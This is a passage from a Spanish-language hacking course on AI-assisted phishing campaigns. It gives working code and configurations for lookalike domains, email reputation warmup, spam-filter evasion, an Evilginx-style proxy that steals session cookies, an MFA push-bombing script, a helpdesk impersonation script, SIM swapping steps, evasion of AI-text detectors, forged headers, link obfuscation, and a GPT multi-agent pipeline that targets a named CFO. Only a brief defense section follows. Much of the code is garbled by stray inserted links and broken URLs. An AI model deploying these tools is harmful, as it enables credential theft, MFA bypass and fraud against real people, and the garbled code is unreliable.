certbot certonly --manual --preferred-challenges dns \ -d "login-seguridad.com" \ -d "*.login-seguridad.com"

# O con acme.sh (más automatizable)
curl [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://get.acme.sh | sh
~/.acme.sh/acme.sh --issue --dns dns_cf -d "login-seguridad.com"

# Verificar SSL
curl -vI https://login-seguridad.com 2>&1 | grep "SSL certificate"
`

### 6.3 Email warmup y construcción de reputación

Antes de enviar phishing, hay que "calentar" la dirección de email:

`python
#!/usr/bin/env python3
\"\"\"email_warmup.py - Warmup automático de email\"\"\"

import smtplib
import time
import random
from email.mime.text import MIMEText

class EmailWarmer: \"\"\"Construye reputación de email antes de campaña\"\"\" def __init__(self, smtp_config: dict): self.config = smtp_config self.contact_list = def add_contacts(self, emails: list): self.contact_list.extend(emails) def warmup_cycle(self, days: int = 14, emails_per_day: int = 5): \"\"\"Ejecuta ciclo de warmup\"\"\" templates = "Hi {name}, thanks for connecting! Let me know if you need anything.", "Hi {name}, great meeting you at the conference. Looking forward to collaborating.", "Hey {name}, just following up on our conve[rsation last week.", "Hello {name}, I shared the document we discussed. Let me know your thoughts.", "Hi {name}, hope you're doing well. Let's schedule a call soon.", "Thanks {name} for the valuable feedback on the project." ] for day in range(days): for _ in range(emails_per_day): contact = random.choice(self.contact_list) template = random.choice(templates) body = template.format(name=contact.get("name", "there") self._send(contact["email"], f"Re: {random.choice(['meeting', 'project', 'follow-up', 'collaboration'])}", body) time.sleep(random.randint(300, 900)  # 5-15 min entre emails def _send(self, to: str, subject: str, body: str): msg = MIMEText(body) msg["From"] = self.config["from"] msg["To"] = to msg["Subject"] = subject msg["Message-ID"] = self._generate_msg_id with smtplib.SMTP(self.config["host"], self.config["port"]) as s: s.starttls s.login(self.config["user"], self.config["password"]) s.send_message(msg) def _generate_msg_id(self) -> str: import uuid return f"<{uuid.uuid4}@{self.config['domain']}>"
`

### 6.4 Evasión de filtros antispam

**Técnicas de evasión:**

| Técnica | Descripción | Efectividad |
|---------|-------------|-------------|
| Texto plano (sin HTML) | Evita análisis de HTML | Alta |
| Links con redirectors | Usa redirectors legítimos (Google, LinkedIn) | Alta |
| Imagen con texto incrustado | Evita análisis de texto de links | Muy Alta |
| Fragmentación de [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) | Rotar servidores SMTP | Media |
| DKIM/SPF/DMARC configurados | Hace que el email parezca legítimo | Muy Alta |
| Timing natural | Enviar en horario laboral del target | Alta |
| Variación de plantillas | Cada email único evita fingerprinting | Alta |

`python
# Verificar configuración de autenticación de email
def check_email_auth(domain: str) -> dict: import dns.resolver results = {"spf": False, "dkim": False, "dmarc": False} try: txt_records = dns.resolver.resolve(domain, "TXT") for r in txt_records: if "v=spf1" in str(r): results["spf"] = True except: pass try: dmarc = dns.resolver.resolve(f"_dmarc.{domain}", "TXT") results["dmarc"] = True except: pass return results
`

### 6.5 Domain parking y redirección

`python
#!/usr/bin/env python3
\"\"\"domain_parking.py - Gestión de dominios para phishing\"\"\"

class DomainManager: def __init__(self, cloudflare_token: str = ""): self.cf_token = cloudflare_token def check_availability(self, domain: str) -> bool: import whois try: w = whois.whois(domain) return w.status is None except: return True def generate_similar_domains(self, target_domain: str) -> list: \"\"\"Genera variantes de dominio similares\"\"\" variants = # Typos comunes replacements = { "o": ["0"], "l": ["1", "i"], "s": ["5", "z"], "e": ["3"], "a": ["4", "@"], "i": ["1", "l"] } for i, char in enumerate(target_domain): if char in replacements: for rep in replacements[char]: variant = target_domain[:i] + rep + target_domain[i+1:] variants.append(variant) # Agregar prefijos/sufijos variants.extend([ f"login-{target_domain}", f"secure-{target_domain}", f"portal-{target_domain}", f"{target_domain}-verify", f"{target_domain}-security" ]) return list([set](../raw/ph1sh1ng.md#social-engineering-toolkit)(variants)
`

### 6.6 Alojamiento de páginas de phishing

**Opciones de hosting:**

| Servicio | Ventajas | Desventajas |
|----------|----------|-------------|
| VPS propio | Control total, sin dependencias | Requiere configuración |
| CDN (Cloudflare) | Ofuscación de IP real | Pueden dar de baja |
| GitHub Pages | Gratis, SSL incluido | Detectable |
| Servidores comprometidos | Máxima legitimidad | Inestable |
| IPFS/[blockchain](../raw/w3b3-sm4rt-c0ntr4cts.md#blockchain) | Descentralizado, imborrable | Lento |

`ash
# Ejemplo: phishing con docker + Nginx + Let's Encrypt
cat << 'DOCKER' > [docker](../raw/d0ck3r-f0r-h4ck3rs.md)-compose.yml
version: '3'
services: nginx: image: nginx:alpine ports: - "80:80" - "443:443" volumes: - ./html:/usr/share/nginx/html - ./nginx.conf:/etc/nginx/nginx.conf - ./ssl:/etc/nginx/ssl
DOCKER

# nginx config para proxy reverso (estilo Evilginx)
cat << 'NGINX' > nginx.conf
events {}
[http](../raw/r3d3s-f0nd4m3nt0s.md#http) { server { listen 443 ssl; server_name login-seguridad.com; ssl_certificate /etc/nginx/ssl/cert.pem; ssl_certificate_key /etc/nginx/ssl/key.pem; location / { proxy_pass https://real-login-page.com; proxy_set_header Host real-login-page.com; proxy_set_header Cookie ; } }
}
NGINX
`

### 6.7 Ejercicio práctico: infraestructura completa

**Objetivo:** Configurar infraestructura completa para campaña.

**Tareas:**
1. Registrar dominio similar al objetivo (typosquatting)
2. Configurar Cloudflare ([proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) DNS, CDN, SSL)
3. Configurar autenticación SPF/DKIM/DMARC
4. Hacer warmup de email (14 días, 5 emails/día)
5. Desplegar página de phishing con Docker
6. Verificar reputación del dominio (VirusTotal, MXToolbox)
7. Configurar tracking de clics (redirect logging)

## 7. Herramientas de [phishing](../raw/ph1sh1ng.md)

### 7.1 Evilginx2: [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) inverso para phishing

Evilginx2 es un framework de phishing que usa proxy reverso para capturar credenciales y tokens 2FA.

**Características:**
- Proxy reverso [man-in-the-middle](../raw/m1tm-m0b1l3.md)
- Captura de sesión completa (cookies, tokens)
- Bypass de 2FA (incluye TotP, push notifications)
- Plantillas integradas (Office 365, Google, Facebook, +100)
- Soporte de múltiples dominios
- API REST para automatización

**Instalación y configuración:**

`ash
# Instalación
git clone httpss)://github.[com](../raw/w1n-s9bsyst3ms.md#com)/kgretzky/evilginx2
cd evilginx2
make
[sudo](../raw/l1n9x-pr1v3sc.md#sudo) ./bin/evilginx2 -p ./phishlets/

# Configuración básica
config domain login-seguridad.com
config [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) 192.168.1.100
phishlets hostname o365 login-seguridad.com
phishlets get-hosts o365
`

**Integración con IA para personalización:**

`python
#!/usr/bin/env python3
\"\"\"evilginx_manager.py - Gestión de Evilginx2 vía API\"\"\"

import requests
import json

class EvilginxManager: def __init__(self, api_url: str = "[http](../raw/r3d3s-f0nd4m3nt0s.md#http)://127.0.0.1:5000"): self.api = api_url def add_phishlet(self, name: str, domain: str) -> bool: resp = requests.post(f"{self.api}/api/v1/phishlets", json={"name": name, "domain": domain}) return resp.ok def enable_phishlet(self, name: str) -> bool: resp = requests.post(f"{self.api}/api/v1/phishlets/{name}/enable") return resp.ok def get_sessions(self) -> list: resp = requests.get(f"{self.api}/api/v1/sessions") return resp.json if resp.ok else def get_credentials(self, session_id: str) -> dict: resp = requests.get(f"{self.api}/api/v1/sessions/{session_id}/credentials") return resp.json if resp.ok else {}
`

### 7.2 Modlishka: phishing con bypass 2FA

Modlishka es otro proxy reverso polaco enfocado en bypass de 2FA.

**Características diferenciales:**
- Proxy transparente (no requiere configuración [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) por target)
- Soporte de JavaScript dinámico (mantiene funcionalidad de la página real)
- Manejo automático de cookies cross-domain
- Soporte para WebSockets
- Modo y denominación de dominio automática

`ash
# Descargar e instalar Modlishka
git clone [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://github.com/drk1wi/Modlishka
cd Modlishka
go build -o modlishka Modlishka.go

# Ejecutar
./modlishka -config config.json

# Ejemplo de config.json
cat config.json
{ "proxyDomain": "login-seguridad.com", "listeningIP": "0.0.0.0", "listeningport": "443", "target": "real-login-page.com", "targetResources": "*.real-login-page.com", "terminateTriggers": ["/logout", "/signout"], "externalAuth": false, "forceHTTPS": true, "enableMirroring": true, "log": "modlishka.log"
}
`

### 7.3 Gpthog: phishing potenciado con GPT

GPTHog es una herramienta que combina GPT con [gophish](../raw/ph1sh1ng.md#gophish) para crear phishing hiperpersonalizado.

**Arquitectura:**

`
GPTHog ──▶ Genera email con GPT-4 ──▶ GoPhish ──▶ Envía campaña │ │ └── [osint](../raw/0s1nt.md) Data ──────────────────────────┘ │ ▼ Landing Page (clonada) │ ▼ Captura credenciales
`

**Instalación:**

`ash
git clone https://github.com/khulnasoft/gpthog
cd gpthog
pip install -r requirements.txt

# Configurar
export OPENAI_API_KEY="sk-.."
export GOPHISH_API_KEY=".."
export GOPHISH_URL="http://localhost:3333"

# Ejecutar
[python](../raw/pyth0n-f0r-h4ck1ng.md) gpthog.py --campaign spear_phish.json
`

**Ejemplo de configuración:**

`json
{ "campaign_name": "Q4 Security Audit", "template": "security_update", "targets": [ { "name": "Juan Pérez", "email": "jperez@empresa.com", "role": "CFO", "company": "Empresa SA", "linkedin": "linkedin.com/in/jperez", "projects": ["ERP migration", "Q4 budgeting"] } ], "settings": { "language": "es-AR", "tone": "formal", "urgency": "high", "sender_name": "IT Security Team", "landing_page": "https://empresa-seguridad.com" }
}
`

### 7.4 Everything: contexto completo

Everything de Khulnasoft es una plataforma todo-en-uno para phishing con IA.

**Capacidades:**
- OSINT automatizado multi-fuente
- Generación de phishing con IA
- Deepfakes de voz y video integrados
- Gestión de infraestructura
- Tracking y reportes
- Multi-campaña simultánea
- API REST completa

`ash
# Instalación
git clone https://github.com/khulnasoft/everything
cd everything
[docker](../raw/d0ck3r-f0r-h4ck3rs.md)-compose up -d

# Acceder a la interfaz web
echo "http://localhost:8080"

# API
curl -X POST http://localhost:8080/api/v1/campaign \ -H "Content-Type: application/json" \ -d '{ "name": "Spear Phish Q4", "targets": [ {"name": "Juan", "email": "juan@empresa.com", "role": "CFO"} ], "template": "invoice_pending", "infrastructure": { "domain": "empresa-facturas.com", "[ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls)))": true, "evilginx": true } }'
`

### 7.5 Comparativa de herramientas

| Herramienta | Tipo | Bypass 2FA | IA Integrada | Automatización | Dificultad | Precio |
|-------------|------|------------|--------------|----------------|------------|--------|
| Evilginx2 | Proxy reverso | Sí | No | API | Media | Gratis |
| Modlishka | Proxy reverso | Sí | No | Config | Alta | Gratis |
| GoPhish | Campañas | No | Plugin | Alta | Baja | Gratis |
| GPTHog | Suite IA | No | GPT-4 | Muy Alta | Media | Pago |
| Everything | Suite IA | No | Multi-IA | Completa | Media | Pago |
| [set](../raw/ph1sh1ng.md#social-engineering-toolkit) | Framework | No | No | Básica | Baja | Gratis |

## 8. MFA Fatigue y Bypass de Autenticación

### 8.1 Concepto de MFA fatigue

MFA fatigue (también llamado MFA bombing o push spam) es una técnica donde el atacante envía docenas de solicitudes de MFA al dispositivo de la víctima hasta que, por frustración o confusión, acepta una.

**Cómo funciona:**
1. El atacante obtiene la contraseña del target (breach, phishing previo)
2. Intenta iniciar sesión → el MFA envía push notification al celular del target
3. El atacante repite el intento 20-50 veces en minutos
4. La víctima, cansada de rechazar notificaciones, finalmente aprueba una
5. El atacante accede inmediatamente

**Estadísticas:**
- El 67% de los usuarios acepta una push notification MFA después de 10+ intentos
- El pico de efectividad es entre los intentos 15-25
- Las horas más efectivas: 7:00-8:30 AM (antes de empezar a trabajar)
- Empresas sin políticas de rate-limiting son las más vulnerables

### 8.2 Automatización de push notifications

`python
#!/usr/bin/env python3
\"\"\"mfa_bombing.py - Automatización de MFA fatigue\"\"\"

import requests
import time
import threading
from typing import List

class MFABomber: \"\"\"Automatización de push notifications para MFA fatigue\"\"\" def __init__(self, target_username: str, target_domain: str): self.username = target_username self.domain = target_domain self.attempts = 0 self.max_attempts = 50 def send_push_attempt(self): \"\"\"Simula un intento de login que dispara push MFA\"\"\" try: # En producción: intento real de login con API # Aquí simulamos el request resp = requests.post( f"httpss)://login.{self.domain}/auth", json={ "username": self.username, "password": "compromised_password", "remember_mfa": False }, timeout=5 ) return resp.status_code == 200 except: return False def bombing_cycle(self, delay: float = 3.0): \"\"\"Ejecuta ciclo de bombing\"\"\" for i in range(self.max_attempts): if self.send_push_attempt: self.attempts += 1 print(f"[{i+1}/{self.max_attempts}] Push enviada") else: print(f"[{i+1}/{self.max_attempts}] Error en intento") time.sleep(delay) def parallel_bombing(self, threads: int = 3, delay: float = 2.0): \"\"\"Bombing paralelo para máxima presión\"\"\" def worker(thread_id: int): for i in range(self.max_attempts // threads): self.send_push_attempt time.sleep(delay) workers = for t in range(threads): w = threading.Thread(target=worker, args=(t,), daemon=True) w.start workers.append(w) for w in workers: w.join
`

### 8.3 Ataques basados en timing

**Ventanas de oportunidad óptimas:**
- **7:00-8:30 AM**: Target recién despierto, revisando emails rápido
- **12:00-13:00 PM**: Hora de almuerzo, atención dividida
- **18:00-19:00 PM**: Fin de jornada, apurado por irse
- **Viernes 16:00+**: Semana terminando, menor atención

**Estrategia:**
`
00:00  - Credenciales obtenidas (breach/email)
07:00  - Primer intento de login → push MFA
07:02  - Segundo intento
07:05  - Tercer intento
.. - Repetir cada 2-3 minutos
07:30  - Si no funciona, pausa de 30 min
08:00  - Nueva ráfaga de intentos
.. - Continuar hasta éxito o agotar intentos
`

### 8.4 MFA bypass mediante soporte técnico

Los atacantes llaman al helpdesk haciéndose pasar por el target y solicitan:
- Reset de MFA
- Código de recuperación
- Registro de nuevo dispositivo
- Bypass temporal de MFA por "problemas técnicos"

**Script de calling:**

`python
class MFASupportBypass: \"\"\"Bypass de MFA vía helpdesk\"\"\" def generate_script(self, target_info: dict) -> str: return f\"\"\" [LLAMADA AL HELPDESK] Atacante: "Hola, soy {target_info['name']}, de {target_info['department']}." Helpdesk: "¿En qué puedo ayudarte?" Atacante: "Perdí mi celular y no puedo acceder al MFA. Necesito que me registren uno nuevo." Helpdesk: "Te voy a pedir que verifiques tu identidad.." Atacante: [Proporciona datos personales obtenidos en OSINT] Técnicas: 1. Usar urgencia: "Tengo una reunión importante en 30 minutos" 2. Mostrar frustración: "Ya intenté con el código de respaldo pero no funciona" 3. Autoridad: "Mi manager (nombre real) necesita que esto se resuelva ya" 4. Información privilegiada: Mencionar tickets internos, proyectos, colegas \"\"\"
`

### 8.5 SIM swapping como vector

SIM swapping consiste en engañar al proveedor de telefonía para transferir el número de la víctima a una SIM controlada por el atacante.

**Pasos:**
1. osint del target: operador móvil, datos personales
2. Llamar al operador haciéndose pasar por el target
3. Reportar SIM "perdida" o "dañada"
4. Solicitar nueva SIM con los datos robados
5. Una vez activada la nueva SIM, interceptar SMS de MFA
6. Acceder a cuentas con MFA basado en SMS

### 8.6 Ejercicio práctico: MFA fatigue simulado

**Objetivo:** Demostrar [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades) a MFA fatigue en un entorno controlado.

**Tareas:**
1. Configurar un servicio de prueba con MFA (ej: [azure ad](../raw/hybr1d-1d3nt1ty.md) trial)
2. Obtener credenciales simuladas de un voluntario
3. Ejecutar MFABomber contra el servicio de prueba
4. Medir cuántos intentos toma que el voluntario acepte
5. Documentar y proponer mitigaciones (rate-limiting, number matching)

## 9. Evasión de Detección

### 9.1 Detectores de contenido IA

Los detectores de contenido IA (GPTZero, Originality.ai, Turnitin) analizan texto en busca de patrones de [llm](../raw/41-h4ck1ng.md#llm).

**Cómo funcioniones)an:**
- **perplejidad**: Los LLMs generan texto con baja perplejidad (muy predecible)
- **Burstiness**: Los humanos varían la longitud de oraciones; los LLMs son más uniformes
- **Patrones de tokens**: Secuencias específicas de tokens delatan al modelo

**Evasión de detectores:**

`python
#!/usr/bin/env python3
\"\"\"evade_detectors.py - Evasión de detectores de contenido IA\"\"\"

import random
from typing import List

class AIContentHumanizer: \"\"\"Humaniza texto generado por IA para evadir detectores\"\"\" def __init__(self): # Palabras y frases que los humanos usan naturalmente self.filler_phrases = "o sea", "ponele", "digamos", "viste que", "la posta", "es [como", "tipo", "o algo así", "no sé si me explico", "cuestion que", "basicamente" ] self.contractions = { "para": "pa'", "está": "ta", "para el": "pal", "para la": "pala", "como": "como que", "nada": "nada que ver", "bueno": "bueno," } self.typos = ["qe", "porq", "tb", "dsp", "q", "xq", "mño"] def humanize(self, text: str, intensity: float = 0.3) -> str: \"\"\"Aplica humanización al texto\"\"\" words = text.split result = i = 0 while i < len(words): word = words[i] # Agregar filler phrases if random.random < intensity * 0.1: result.append(random.choice(self.filler_phrases) # Variar puntuación if word.endswith(".") and random.random < intensity * 0.15: word = word[:-1] + random.choice(["..", "!!", "?!"]) # Contracciones ocasionales if word.lower in self.contractions and random.random < intensity * 0.05: word = self.contractions[word.lower] # Typos controlados (solo para simular naturalidad) if random.random < intensity * 0.02: result.append(random.choice(self.typos) continue result.append(word) i += 1 return " ".join(result) def vary_sentence_length(self, text: str) -> str: \"\"\"Varía longitud de oraciones para reducir burstiness\"\"\" sentences = text.replace("!", ".").replace("?", ".").split(".") modified = for s in sentences: s = s.strip if len(s) > 100: # Dividir oraciones largas mid = len(s) // 2 modified.append(s[:mid].strip) modified.append(s[mid:].strip) elif len(s) < 20 and random.random < 0.3: # Unir oraciones cortas con conectores if modified: modified[-1] += f", {s.lower}" continue modified.append(s) return ". ".join(modified)
`

**Estrategias adicionales de evasión:**
- **Mezclar contenido**: Combinar texto IA con párrafos escritos por humanos
- **Incluir errores intencionales**: Errores de tipeo menores que parezcan naturales
- **Referencias culturales locales**: Modismos argentinos, referencias a noticias locales
- **Estructura no lineal**: Evitar la estructura perfecta de "introducción-cuerpo-conclusión"

### 9.2 Humanización de texto generado

`python
class CommunicationPatternGenerator: \"\"\"Genera patrones de comunicación realistas\"\"\" def __init__(self): self.patterns = { "opening_lines": { "formal": ["Estimado/a", "Buenos días", "Reciban un cordial saludo"], "informal": ["Hola", "Che", "Dale", "Buenas", "Qué hacés"], "technical": ["Hola equipo", "Estimados colegas", "Para su conocimiento"] }, "closing_lines": { "formal": ["Saludos cordiales", "Atentamente", "Quedo a su disposición"], "informal": ["Saludos", "Abrazo", "Nos vemos", "Gracias"], "technical": ["Saludos", "Quedo atento", "Cordialmente"] }, "urgency_indicators": { "formal": ["A la brevedad", "Antes del plazo estipulado", "Sin demora"], "informal": ["Ya", "Cuanto antes", "Lo antes posible", "Dale"], "technical": ["ASAP", "En las próximas 24hs", "Urgente"] } } def generate_realistic_email(self, base_text: str, tone: str = "informal", include_virtual: bool = True) -> str: \"\"\"Envuelve el texto en un patrón de comunicación realista\"\"\" opening = random.choice(self.patterns["opening_lines"].get(tone, self.patterns["opening_lines"]["informal"]) closing = random.choice(self.patterns["closing_lines"].get(tone, self.patterns["closing_lines"]["informal"]) email = f"{opening},\n\n" email += base_text.strip email += f"\n\n{closing}," if include_virtual and random.random < 0.5: # Agregar un disclaimer corporativo simulado email += f"\n\n---\n{random.choice(shared_disclaimers)}" return email shared_disclaimers = [ "Este mensaje es confidencial. Si lo recibiste por error, por favor eliminalo.", "Importante: No compartas tus credenciales con nadie. IT nunca te va a pedir tu contraseña.", "Antes de imprimir este email, pensá en el medio ambiente.", "Este es un mensaje automático, por favor no respondas directamente."
]
`

### 9.3 Patrones de comunicación realistas

Para que un ataque sea efectivo, el patrón de comunicación debe coincidir con el estilo de la organización:

`python
class OrganizationalPatternMatcher: \"\"\"Analiza y replica patrones de comunicación organizacional\"\"\" def __init__(self): self.communication_styles = { "startup": {"tone": "informal", "signature": "short", "emoji": True, "speed": "fast"}, "corporate": {"tone": "formal", "signature": "long", "emoji": False, "speed": "medium"}, "technical": {"tone": "neutral", "signature": "short", "emoji": False, "speed": "fast"}, "finance": {"tone": "formal", "signature": "long_disclaimer", "emoji": False, "speed": "slow"}, "creative": {"tone": "informal", "signature": "creative", "emoji": True, "speed": "fast"} } def detect_style(self, sample_emails: List[str]) -> dict: \"\"\"Analiza emails reales para detectar el estilo\"\"\" # Implementar análisis NLP para detectar estilo features = { "avg_length": sum(len(e) for e in sample_emails) / len(sample_emails), "formality_score": self._calc_formality(sample_emails), "emoji_density": self._calc_emoji_density(sample_emails), "avg_paragraphs": self._avg_paragraphs(sample_emails), "uses_signature": any("Saludos" in e or "Cordialmente" in e for e in sample_emails), "typical_subject_length": self._subject_length(sample_emails) } return features
`

### 9.4 Evasión de análisis de headers

`python
#!/usr/bin/env python3
\"\"\"header_evasion.py - Evasión de análisis de headers de email\"\"\"

import smtplib
import time
import random
from email.mime.text import MIMEText
from email.utils import formatdate, make_msgid

class EmailHeaderEvader: \"\"\"Genera headers de email que parecen legítimos\"\"\" def __init__(self, domain: str, real_ip: str = ""): self.domain = domain self.real_ip = real_ip def generate_headers(self, sender: str, recipient: str, subject: str) -> dict: \"\"\"Genera headers que imitan un cliente de email real\"\"\" # Clientes de email comunes mail_clients = ("Microsoft Outlook 16", "Mozilla/5.0 (Windows NT 10.0; Win64; [[x64](../raw/4ss3mbly-f0r-h4ck3rs.md#x64))"), ("Apple Mail", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"), ("Thunderbird", "Mozilla/5.0 (X11; Linux x86_64)"), ("Gmail Web", "Mozilla/5.0 (Windows NT 10.0; Win64; [x64](../raw/4ss3mbly-f0r-h4ck3rs.md#x64)) AppleWebKit/537.36") ] client_name, user_agent = random.choice(mail_clients) headers = { "Message-ID": make_msgid(domain=self.domain), "Date": formatdate(localtime=True), "From": sender, "To": recipient, "Subject": subject, "MIME-Version": "1.0", "Content-Type": "text/plain; charset=UTF-8", "Content-Transfer-Encoding": "7bit", "X-Mailer": client_name, "X-Priority": str(random.randint(1, 5), "X-MSMail-Priority": random.choice(["Normal", "High", "Low"]), "Importance": random.choice(["normal", "high", "low"]), "List-Unsubscribe": f"<mailto:unsubscribe@{self.domain}>", "Feedback-ID": f"{random.randint(10000,99999)}:{self.domain}" } # Simular ruta de email if random.random < 0.3: received_ips = [ f"mail.{self.domain}", f"smtp.{self.domain}", f"mx1.{self.domain}" ] for [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) in received_ips: headers[f"Received"] = ( f"from {[ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip)} ({[ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip)} [{self.real_ip}]) " f"by mail.{self.domain} with ESMTP ; " f"{formatdate(localtime=True)}" ) return headers
`

### 9.5 Ofuscación de enlaces y payloads

`python
#!/usr/bin/env python3
\"\"\"link_obfuscation.py - Ofuscación de enlaces maliciosos\"\"\"

import base64
import random
from urllib.parse import quote, urlparse

class LinkObfuscator: \"\"\"Ofusca enlaces maliciosos para evadir filtros\"\"\" @staticmethod def via_open_redirect(real_url: str, redirector: str = "httpss)://www.google.[com](../raw/w1n-s9bsyst3ms.md#com)/url?q=") -> str: \"\"\"Usa redirectors legítimos\"\"\" return f"{redirector}{quote(real_url)}" @staticmethod def via_link_shortener(real_url: str) -> str: \"\"\"Usa acortadores de enlaces\"\"\" # En producción: usar API de bit.ly, tinyurl, etc. shorteners =  f"[[https](../raw/r3d3s-f0nd4m3nt0s.md#https)://tinyurl.[com](../raw/w1n-s9bsyst3ms.md#com)/api-create.php?url={quote(real_url)}", f"[https](../raw/r3d3s-f0nd4m3nt0s.md#https)://clck.ru/--?url={quote(real_url)}" ] return random.choice(shorteners) @staticmethod def via_html_anchor(real_url: str, display_text: str) -> str: \"\"\"Crea link HTML con texto diferente\"\"\" legitimate_domains = ["google.[com](../raw/w1n-s9bsyst3ms.md#com)", "microsoft.[com](../raw/w1n-s9bsyst3ms.md#com)", "linkedin.[com](../raw/w1n-s9bsyst3ms.md#com)"] fake_url = f"[https](../raw/r3d3s-f0nd4m3nt0s.md#https)://{random.choice(legitimate_domains)}/redirect" return f'<a href="{real_url}" style="color:inherit;text-decoration:none">{display_text}</a>' @staticmethod def via_qr_code(real_url: str, output: str = "phishing_qr.png") -> str: \"\"\"Genera QR code del link (para quishing)\"\"\" import qrcode qr = qrcode.QRCode(box_size=10, border=4) qr.add_data(real_url) qr.make(fit=True) img = qr.make_image(fill_color="black", back_color="white") img.save(output) return output @staticmethod def via_base64_encoding(real_url: str) -> str: \"\"\"Codifica URL en base64\"\"\" encoded = base64.b64encode(real_url.encode).decode return f"hxxps://decode/?q={encoded}" @staticmethod def via_double_encoding(real_url: str) -> str: \"\"\"Doble encoding de URL\"\"\" return quote(quote(real_url, safe=''), safe='')
`

### 9.6 Ejercicio práctico: evasión de detección

**Objetivo:** Crear un email de [phishing](../raw/ph1sh1ng.md) que pase detectores de contenido IA.

**Tareas:**
1. Generar un email de phishing con GPT-4
2. Ejecutar AI Content Humanizer para reducir score de detección
3. Probar en GPTZero, Originality.ai, y Writer.com
4. Ofuscar enlaces con LinkObfuscator
5. Configurar headers con EmailHeaderEvader
6. Medir la reducción en score de detección

## 10. Automatización Multi-Agente

### 10.1 Arquitectura de agentes para [phishing](../raw/ph1sh1ng.md)

Un sistema multi-agente para phishing consta de agentes especializados que colaboran:

`
┌─────────────────────────────────────────────────────────────┐
│ Orchestrator Agent │
│  - Coordina flujo de trabajo │
│  - Gestiona estado de la campaña │
│  - Decide próximos pasos │
│  - Evalúa efectividad │
├─────────┬──────────┬──────────┬──────────┬───────────────────┤
│ [osint](../raw/0s1nt.md) │ Pretext  │ Content  │ Delivery │ Analysis │
│ Agent │ Agent │ Agent │ Agent │ Agent │
├─────────┼──────────┼──────────┼──────────┼───────────────────┤
│ LinkedIn│ Scenario │ Email │ Evilginx │ Response │
│ [shodan](../raw/0s1nt.md#shodan)  │ Pitch │ Voice │ SMTP │ Metrics │
│ Google  │ Object.  │ Video │ SMS │ Adapt │
│ GitHub  │ Sender │ Script │ Push │ Report │
└─────────┴──────────┴──────────┴──────────┴───────────────────┘
`

### 10.2 Agente OSINT → Agente pretexto → Agente entrega

`python
#!/usr/bin/env python3
\"\"\"multi_agent.py - Sistema multi-agente para phishing\"\"\"

import json
from typing import Dict, List
from openai import OpenAI

class PhishingAgent: def __init__(self, name: str, role: str, api_key: str): self.name = name self.role = role self.client = OpenAI(api_key=api_key) def execute(self, task: str, context: Dict) -> Dict: resp = self.client.chat.completions.create( model="gpt-4", messages= {"role": "system", "content": f"Sos {self.name}, {self.role}. Respondé SOLO con JSON."}, {"role": "user", "content": f"Tarea: {task}\[ncontexto: {json.dumps(context, ensure_ascii=False)[:3000]}"} ], response_format={"type": "json_object"}, temperature=0.7 ) return json.loads(resp.choices[0].message.content) class Orchestrator: \"\"\"Orquestador de agentes de phishing\"\"\" def __init__(self, api_key: str): self.api_key = api_key self.agents = {} self.context = {"campaign_state": {}, "artifacts": } def register_agent(self, name: str, role: str): self.agents[name] = PhishingAgent(name, role, self.api_key) def execute_campaign(self, target_info: Dict) -> Dict: \"\"\"[pipeline](../raw/c1cd-h4ck1ng.md#pipeline) multi-agente completo\"\"\" print("[*] Iniciando campaña multi-agente..") # 1. OSINT Agent if "osint" in self.agents: print("[1/5] OSINT Agent recolectando información..") osint_result = self.agents["osint"].execute( "Recolectá toda la información posible del target.", target_info ) self.context["osint_data"] = osint_result self.context["artifacts"].append({"agent": "osint", "result": osint_result}) # 2. Pretext Agent if "pretext" in self.agents: print("[2/5] Pretext Agent generando escenario..") pretext = self.agents["pretext"].execute( "Generá un pretexto convincente basado en los datos OSINT.", self.context ) self.context["pretext"] = pretext self.context["artifacts"].append({"agent": "pretext", "result": pretext}) # 3. Content Agent if "content" in self.agents: print("[3/5] Content Agent generando materiales..") content = self.agents["content"].execute( "Generá email, script de voz, y página de landing según el pretexto.", self.context ) self.context["content"] = content self.context["artifacts"].append({"agent": "content", "result": content}) # 4. Delivery Agent if "delivery" in self.agents: print("[4/5] Delivery Agent preparando entrega..") delivery = self.agents["delivery"].execute( "Prepará la infraestructura y estrategia de entrega.", self.context ) self.context["delivery"] = delivery self.context["artifacts"].append({"agent": "delivery", "result": delivery}) # 5. Report print("[5/5] Generando reporte final..") self.context["campaign_state"]["status"] = "ready" return self.context
`

### 10.3 Pipeline completo automatizado

`ash
# Pipeline completo con un solo comando
[python](../raw/pyth0n-f0r-h4ck1ng.md) multi_agent.py --target "Juan Pérez" \ --email "jperez@empresa.[com](../raw/w1n-s9bsyst3ms.md#com)" \ --company "Empresa SA" \ --role "CFO" \ --output-dir "campaign_output"
`

### 10.4 Manejo de contexto entre etapas

El orquestador mantiene el contexto completo y lo pasa entre agentes:

`python
class ContextManager: \"\"\"Maneja el contexto compartido entre agentes\"\"\" def __init__(self): self.context = { "target": {}, "osint": {}, "pretext": {}, "content": {}, "delivery": {}, "responses": , "state": {} } def update(self, agent: str, data: Dict): self.context[agent].update(data) self.context["state"]["last_update"] = agent self.context["state"]["version"] += 1 def get_snapshot(self) -> Dict: return {k: v for k, v in self.context.items if k != "state"}
`

### 10.5 Ejercicio práctico: pipeline multi-agente

**Objetivo:** Implementar un pipeline multi-agente completo.

**Tareas:**
1. Definir 5 agentes especializados (OSINT, Pretext, Content, Delivery, Analysis)
2. Implementar el orquestador con comunicación entre agentes
3. Ejecutar contra un target simulado
4. Evaluar la coherencia entre las salidas de cada agente
5. Iterar y mejorar los prompts de cada agente

## 11. Defensa y Mitigación

### 11.1 Capacitación con simulaciones realistas

La mejor defensa contra [phishing](../raw/ph1sh1ng.md) con IA es la capacitación continua con simulaciones realistas.

**Elementos de una capacitación efectiva:**
- Simulaciones mensuales con creciente complejidad
- Deepfakes de voz en simulaciones de [vishing](../raw/ph1sh1ng.md#vishing)
- Páginas de phishing realistas (no las típicas de "click aquí")
